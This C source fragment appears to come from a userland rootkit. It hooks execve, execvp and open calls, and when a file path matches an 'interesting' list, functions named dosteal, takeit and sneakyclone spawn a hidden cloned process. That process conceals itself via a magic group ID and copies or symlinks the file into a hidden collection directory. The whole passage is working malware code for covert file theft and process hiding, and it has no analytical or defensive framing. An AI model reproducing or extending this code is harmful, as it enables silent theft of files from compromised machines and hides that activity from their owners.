#if defined FALLBACK_SYMLINK || defined ONLY_SYMLINK
int linkfile(const char *oldpath, const char *newpath){
    hook(CSYMLINK);
    char newnewpath[strlen(newpath)+6];
    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);

    if(*oldpath == '/')
        return (long)call(CSYMLINK, oldpath, newnewpath);
    
    // if oldpath is not a full pathname we must get it now
    char *cwd, *oldoldpath;

    cwd = getcwd(NULL, 0);
    if(cwd == NULL) return 1;
    oldoldpath = fullpath(cwd, oldpath);
    clean(cwd);

    if(oldoldpath == NULL)
        return 1;

    int ret = (long)call(CSYMLINK, oldoldpath, newnewpath);
    clean(oldoldpath);
    return ret;
}
#endif

struct takeargs{
    char oldpath[PATH_MAX];
    char rootdir[PATH_MAX];
};

/* here begins the new process created by clone. */
static int takeit(void *arg){
    fdclosee();
    !notuser(0) ? hide_self() : 0;

    const struct takeargs *targ = (struct takeargs*)arg;
    const char *oldpath = targ->oldpath,
               *rootdir = targ->rootdir;

    char *newpath = getnewpath(rootdir, oldpath);
    if(newpath == NULL) exit(0);

#ifdef ONLY_SYMLINK
    linkfile(oldpath, newpath);
#else
    int rv = writecopy(oldpath, newpath);
#ifdef FALLBACK_SYMLINK
    rv < 0 ? rv = linkfile(oldpath, newpath) : 0;
#endif
#endif

    clean(newpath);
    exit(0);
}

void __attribute((visibility("hidden"))) dosteal(const char *path, const char *rootdir){
    struct takeargs args;
    memset(&args, 0, sizeof(struct takeargs));
    writeover(args.oldpath, path);
    writeover(args.rootdir, rootdir);
#ifdef FILENAMES_BLACKLIST_SIZE
    !uninteresting(path) ? sneakyclone(takeit, (void*)&args, 8912) : 0;
#else
    sneakyclone(takeit, (void*)&args, 8912);
#endif
}


/* called by the execve, execvp & open hooks.
 * first, if INTEREST_DIR does not exist - it is created, considering the calling process can create it.
 *
 * next, it will be determined whether or not pathname is worth stealing. if it is, memory is allocated for a new process' stack & the
 * new process takes the file, whatever that may mean in the context of your configuration.
 *
 * the new process does not share memory with it's parent, therefore the memory that we allocate here, in the calling process, is freed immediately after the clone.
 *
 * as stated in the comments for sneakyclone, the new process should setgid(MAGIC_GID) immediately if it can, as to hide the process. so in this case, the first
 * thing the takeit function will do, if it can, is hide itself. */
void inspectfile(const char *pathname){
    if(!initmvbc() || rknomore() || sssdproc())
        return;

    if(!direxists(mvbc->interestdir)){
        if(errno == ENOENT && !notuser(0) && preparedir(mvbc->interestdir, mvbc->magicid) != -1)
            inspectfile(pathname);
        return;
    }

    char *filename = NULL;
    if(pathname[strlen(pathname)-1] != '/' && strstr(pathname, "/") != NULL){
        filename = strrchr(pathname, '/')+1;
        if(strlen(filename)<=1) return;
    }

    if(interesting(pathname) || (filename != NULL && interesting(filename)))
        dosteal(pathname, mvbc->interestdir);
}
